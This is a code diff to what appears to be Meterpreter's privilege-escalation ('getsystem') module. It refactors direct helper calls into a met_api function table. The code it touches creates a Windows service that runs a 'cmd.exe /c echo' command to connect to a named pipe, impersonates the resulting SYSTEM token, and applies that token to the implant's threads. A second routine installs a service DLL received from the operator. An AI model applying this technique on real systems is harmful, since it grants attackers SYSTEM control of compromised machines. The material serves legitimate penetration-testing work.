@@ -1,4 +1,5 @@
 #include "precomp.h"
+#include "common_metapi.h"
 #include "namedpipe.h"
 #include "service.h"
 
@@ -42,7 +43,7 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 		}
 
 		while (TRUE) {
-			if (event_poll(thread->sigterm, 0)) {
+			if (met_api->event.poll(thread->sigterm, 0)) {
 				BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. thread->sigterm received",
 					ERROR_DBG_TERMINATE_THREAD);
 			}
@@ -80,7 +81,7 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 
 			// now we can set the meterpreters thread token to that of our system
 			// token so all subsequent meterpreter threads will use this token.
-			core_update_thread_token(remote, hToken);
+			met_api->thread.update_token(remote, hToken);
 
 			dwResult = ERROR_SUCCESS;
 
@@ -129,7 +130,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported.")
 		}
 
-		cpServiceName = packet_get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
+		cpServiceName = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
 		if (!cpServiceName) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. invalid arguments",
 				ERROR_BAD_ARGUMENTS);
@@ -142,14 +143,14 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = thread_create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
 		if (!pThread) {
-			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. thread_create failed",
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
 		}
 
-		if (!thread_run(pThread)) {
-			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. thread_run failed",
+		if (!met_api->thread.run(pThread)) {
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.run failed",
 				ERROR_ACCESS_DENIED);
 		}
 
@@ -176,10 +177,10 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 		}
 
 		// signal our thread to terminate if it is still running
-		thread_sigterm(pThread);
+		met_api->thread.sigterm(pThread);
 
 		// and wait for it to terminate...
-		thread_join(pThread);
+		met_api->thread.join(pThread);
 
 		// get the exit code for our pthread
 		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
@@ -197,7 +198,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 	}
 
 	if (pThread) {
-		thread_destroy(pThread);
+		met_api->thread.destroy(pThread);
 	}
 	if (hSem) {
 		CloseHandle(hSem);
@@ -232,9 +233,9 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 
 	do
 	{
-		cpServiceName   = packet_get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
-		dwServiceLength = packet_get_tlv_value_uint(packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH);
-		lpServiceBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_DLL);
+		cpServiceName   = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_NAME);
+		dwServiceLength = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH);
+		lpServiceBuffer = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_ELEVATE_SERVICE_DLL);
 
 		if (!cpServiceName || !dwServiceLength || !lpServiceBuffer) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. invalid arguments",
@@ -278,14 +279,14 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = thread_create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
 		if (!pThread) {
-			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. thread_create failed",
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
 		}
 
-		if (!thread_run(pThread)) {
-			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. thread_create failed",
+		if (!met_api->thread.run(pThread)) {
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
 				ERROR_ACCESS_DENIED);
 		}
 
@@ -311,9 +312,9 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 
 		WaitForSingleObject(pThread->handle, 10000);
 
-		thread_sigterm(pThread);
+		met_api->thread.sigterm(pThread);
 
-		thread_join(pThread);
+		met_api->thread.join(pThread);
 
 		// get the exit code for our pthread
 		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
@@ -339,7 +340,7 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 	}
 
 	if (pThread) {
-		thread_destroy(pThread);
+		met_api->thread.destroy(pThread);
 	}
 
 	if (hSem) {
